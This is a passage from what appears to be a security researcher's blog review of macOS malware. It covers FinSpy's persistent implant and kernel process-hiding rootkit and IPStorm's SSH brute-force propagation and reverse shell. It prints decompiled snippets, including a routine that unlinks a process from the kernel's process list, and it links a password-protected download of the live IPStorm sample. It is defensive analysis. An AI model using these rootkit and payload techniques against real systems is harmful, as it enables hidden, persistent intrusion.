<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objC" data-lang="objC"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>+(<span style="color:#66d9ef">char</span>)<span style="color:#a6e22e">loadAgent:</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)plist {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    task <span style="color:#f92672">=</span> [[NSTask alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    [task setLaunchPath:<span style="color:#e6db74">@&#34;/bin/launchctl&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    args <span style="color:#f92672">=</span> [NSArray arrayWithObjects:<span style="color:#e6db74">@&#34;load&#34;</span>, plist, <span style="color:#ae81ff">0x0</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    [r15 setArguments:args];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    [task launch];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    [task waitUntilExit];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>The persistent implant (<code>/private/etc/logind</code>), is now off and running!</p>
<br>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Persistent Implant with plugin-based modules and a kernel-level rootkit 
</span>
</p>
<p>Amnesty&rsquo;s <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a> details the capabilities of <code>FinSpy</code>, noting such capabilities are implemented via plugins:</p>
<blockquote>
"FinSpy for Mac OS ...follow(s) a modular design. The launcher `logind` only instantiates the core component `dataPkg`, which oversees communications with the Command and Control server (C&C), and decrypting/launching modules when needed. The modules are encrypted with the AES algorithm and compressed with the `aplib` compression library. The AES key is stored in the binary, but the IV is stored in each configuration file along with a MD5 hash of the final decompressed file."
</blockquote>
<p>The rather extensive list of modules available to the spyware include:
<img src="../images/blog/blog_0x4F/capabilities.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<p>Another interesting capability of this malware is its kernel-mode rootkit functionality. Simply put, (public) macOS malware with ring-0 capabilities is rare!</p>
<p>The file <code>logind.kext</code> is <code>FinSpy</code>&rsquo;s kernel extension &hellip;though it is unsigned:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvv org.logind.ctp.archive/logind.kext/Contents/MacOS/logind 
logind.kext/Contents/MacOS/logind: <b>code object is not signed at all</b>
</pre>
</div>
<br></p>
<div class="note">
<p>As the kernel extension is unsigned, it won&rsquo;t run on any recent version of macOS (which enforce kext code signing requirements).</p>
</div>
<p>It terms of it&rsquo;s functionality, it appears to be a simple process hider.</p>
<p>In a function named <code>ph_init</code>, the kernel extension looks up a bunch of kernel symbols (via a function named <code>ksym_resolve_symbol_by_crc32</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ph_init</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0x127a88e8</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#f92672">*</span>_ALLPROC_ADDRESS <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    rax <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0xfffffffffef1d247</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#f92672">*</span>_LCK_LCK <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#f92672">*</span>_LCK_LCK <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    rax <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0x392ec7ae</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    <span style="color:#f92672">*</span>_LCK_MTX_LOCK <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>        <span style="color:#f92672">*</span>_LCK_MTX_UNLOCK <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0x2472817c</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>}</span></span></code></pre></div>
<p>Based on variable names, it appears that <code>logind.kext</code> is attempting to resolve the pointer of the kernel&rsquo;s global list of <code>proc</code> (process) structures, as well as various locks.</p>
<p>In a function named <code>ph_hide</code> the kext will hide a process. This is done by walking the list of <code>proc</code> structures (pointed to by <code>_ALLPROC_ADDRESS</code>), and looking for the one that matches (to hide):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_ph_hide</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    r14 <span style="color:#f92672">=</span> arg0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#66d9ef">if</span> (r14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    r15 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>_ALLPROC_ADDRESS;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#66d9ef">if</span> (r15 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>SEARCH:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    rax <span style="color:#f92672">=</span> proc_pid(r15);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    rbx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> r14) <span style="color:#66d9ef">goto</span> HIDE;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>loc_15da:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    r15 <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#66d9ef">if</span> (rbx <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> SEARCH;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>HIDE:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    r14 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(r15 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    (<span style="color:#f92672">*</span>_LCK_MTX_LOCK)(<span style="color:#f92672">*</span>_LCK_LCK);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#f92672">*</span>r14 <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    <span style="color:#f92672">*</span>(rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> r14;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    (<span style="color:#f92672">*</span>_LCK_MTX_UNLOCK)(<span style="color:#f92672">*</span>_LCK_LCK);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>}</span></span></code></pre></div>
<p>In the above code, note that <code>HIDE</code> contains the logic to remove the target process of interest, by unlinking it from the (process) list. Once removed, the process is now (relatively) &ldquo;hidden&rdquo;. (Of course one can leverage XNU level APIs to uncover such process hiding).</p>
<p>The malicious kext also appears to be able to communicate with user-mode via the file <code>/tmp/launchd-935.U3xqZw</code>. Specifically, in a function named <code>ksym_init</code>, it will open and read in the contents of this file (which may contain details of the process to hide?):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ksym_init</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_MKI_SIZE <span style="color:#f92672">=</span> fileio_get_file_size(<span style="color:#e6db74">&#34;/tmp/launchd-935.U3xqZw&#34;</span>, arg1);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> _OSMalloc_Tagalloc(<span style="color:#e6db74">&#34;MKI&#34;</span>, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#f92672">*</span>_MKI_TAG <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> .l1;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>loc_1898:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    rax <span style="color:#f92672">=</span> _OSMalloc(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_MKI_SIZE, rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#f92672">*</span>_MKI_BUFFER <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> loc_1921;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>loc_18b2:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">if</span> (fileio_read_file_fully(<span style="color:#e6db74">&#34;/tmp/launchd-935.U3xqZw&#34;</span>, rax) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> loc_1908;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    ....
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>}</span></span></code></pre></div>
<div class="note">
<p>For more on the topic of Mac rootkits, see:</p>
<center>
  "<a href="http://phrack.org/issues/69/7.html" class="inlineLink">Revisiting Mac OS X Kernel Rootkits</a>"
</center>
</div>
<br>
<h3 id="-ipstorm">üëæ <code>IPStorm</code></h3>
<div class="note">
<p>IPStorm is a cross platform botnet, now ported to macOS. Though it&rsquo;s capabilities are limited on macOS, it support a reverse shell, ad faud, and more.</p>
 <p>
  <img src="../images/download.png" height="16" style="vertical-align:middle"/>
  <span style="vertical-align:middle">
    Download: <a href="https://objective-see.com/downloads/malware/IPStorm.zip"><code>IPStorm</code></a> (password: <code>infect3d</code>)
  </span>
</p> 
</div>
<p>In early October researchers a Intezer <a href="https://www.intego.com/mac-security-blog/gravityrat-and-ipstorm-mac-malware-ported-from-windows/">published a report</a> about IPStorm being ported from Windows to Linux&hellip;and also macOS:</p>
<blockquote>
"Our research team recently identified new Linux variants of IPStorm targeting various Linux architectures (ARM, AMD64, Intel 80386) and platforms (servers, Android, IoT). We have also detected a macOS variant." -Intezer
</blockquote>
<p>The macOS version of IPStorm is packed with the UPX packer. Luckily we can use UPX itself (via the <code>-d</code> flag) to completely unpack the malware:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ./upx -d IPStorm 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.09        Markus Oberhumer, Laszlo Molnar & John Reiser   Feb 18th 2013

With LZMA support, Compiled by Mounir IDRASSI (mounir@idrix.fr)

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
  20172924 <-   8216592   40.73%   Mach/AMD64    IPStorm

Unpacked 1 file.

</pre>
</div>
<p>&hellip;once unpacked, analysis can commence.</p>
<br>
<p>
<img src="../images/blog/blog_0x53/writeup.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Writeups:</b></span>
</p>
<ul>
<li>
<p><a href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">&ldquo;A Storm is Brewing: IPStorm Now Has Linux Malware&rdquo;</a></p>
</li>
<li>
<p><a href="https://www.intego.com/mac-security-blog/gravityrat-and-ipstorm-mac-malware-ported-from-windows/">&ldquo;GravityRAT and IPStorm: Mac Malware, Ported from Windows&rdquo;</a></p>
</li>
</ul>
<br>
<p>
<img src="../images/blog/blog_0x53/infect.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Infection Vector</b>: SSH Brute Forcing(?)</span></p>
<p>It is not clear how <code>IPStorm</code> infects macOS systems. However, the Intezer <a href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">report</a> notes that the malware can spread via SSH brute-forcing:</p>
<blockquote>
"The [malware] attempts to spread and infect other victims on the internet by using SSH brute-force. Once a connection is established ...it will proceed to download the payload and infect the server." -Intezer
</blockquote>
<p>At address <code>00000000046e70b0</code> we find a function named <code>storm/scan_tools/ssh.brute</code> &hellip;that if successfully brute-forces a SSH connection on a remote system will call <code>storm/scan_tools/ssh.InstallPayload</code>. This function will ascertain the architecture of the (newly) accessed system (via a call to <code>storm/scan_tools/ssh.SystemInfo.GoArch</code>), and the proceeds to download the appropriate payload (via <code>storm/statik.GetFileContents</code>).</p>
<p>Once the payload has been downloaded to the remote system, <code>IPStorm</code> invokes a function named <code>ssh.(*Session).Start</code> &hellip;which eventually calls <code>runtime.newproc</code> to (likely) kick off the payload on th remote system.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> ssh.InstallPayload(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>  
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>  ssh.SystemInfo.GoArch(...);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>  statik.GetFileContents(...);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>  ssh.(<span style="color:#f92672">*</span>Session).Start(...);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9</span><span>}</span></span></code></pre></div>
<br>
<p>
  <img src="../images/blog/blog_0x53/persist.png"  width="" class="" style="vertical-align:middle">
  <span style="vertical-align:middle"><b>Persistence:</b> None(?)</span>
</p>
<p>While the Windows and Linux versions of <code>IPStorm</code> will persist, it does not appear that the macOS version supports persistence.</p>
<p>The Intezer <a href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">report</a> details a function in the Linux variant, <code>filetransfer.(*File).Persist</code> that, &ldquo;<em>archives persistence</em>&rdquo;.</p>
<p>We find this same function in the macOS version (at address <code>0x004491620</code>)  &hellip;however it does not appear to contain any persistence logic, but instead references the string <code>&quot;Persist not implemented on platform %s&quot;</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-NASM" data-lang="NASM"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#75715e">;filetransfer.(*File).Persist</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#a6e22e">...</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#a6e22e">lea</span>    rax, <span style="color:#66d9ef">qword</span> [<span style="color:#ae81ff">0x4910358</span>] <span style="color:#75715e">;&#34;Persist not implemented on platform %s&#34;</span></span></span></code></pre></div>
<p>Moreover executing the malware (in a virtual machine) does not generate any persistent events.</p>
<br>
<p>
<img src="../images/blog/blog_0x53/capabilities.png"  width="" class="" style="vertical-align:middle">
<span style="vertical-align:middle"><b>Capabilities:</b> Remote Shell, Ad Faud, etc...
</span>
</p>
<p>During their analysis of the Linux variant, the Intezer researchers <a href="https://www.intezer.com/blog/research/a-storm-is-brewing-ipstorm-now-has-linux-malware/">noted</a> that <code>IPStorm</code> would create a reverse shell via functions named <code>backshell.*</code>.</p>
<p>We find these same functions in the macOS variant:</p>
<img src="../images/blog/blog_0x5F/ipShell.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">backshell.* functions</center>

<p>Taking a peek at the <code>backshell.openLocalShell</code> function reveals it invoking <code>powershell.(*Backend).StartProcess</code> &hellip;passing in <code>bash</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> storm<span style="color:#f92672">/</span>backshell.openLocalShell(...) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#75715e">//0x48ed0be -&gt; &#34;bash&#34;
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#75715e"></span>    storm<span style="color:#f92672">/</span>powershell.(<span style="color:#f92672">*</span>Backend).StartProcess(..., <span style="color:#ae81ff">0x48ed0be</span>, ...);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>}</span></span></code></pre></div>
<p>Looking at sockets on an infected system (via our tool <a href="https://objective-see.com/products/netiquette.html">Netiquette</a>), we find that the malware has created a listening socket on a high port:</p>
<img src="../images/blog/blog_0x5F/ipListen.png"  width="100%" class="center" style="border-radius: 4px;">

